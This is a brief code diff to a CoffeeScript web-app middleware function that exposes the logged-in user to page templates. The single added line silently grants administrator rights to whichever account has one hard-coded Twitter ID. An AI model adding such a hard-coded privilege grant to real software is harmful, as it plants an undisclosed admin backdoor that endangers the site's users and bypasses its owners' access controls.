@@ -135,6 +135,7 @@ init = (config, db) ->
 put_user_in_locals = (req, res, next) ->
   if req.user?
     res.locals.user = req.user
+    req.user.admin = true if req.user.twitter_id is 1861911
   next()
 
 exports.init = init
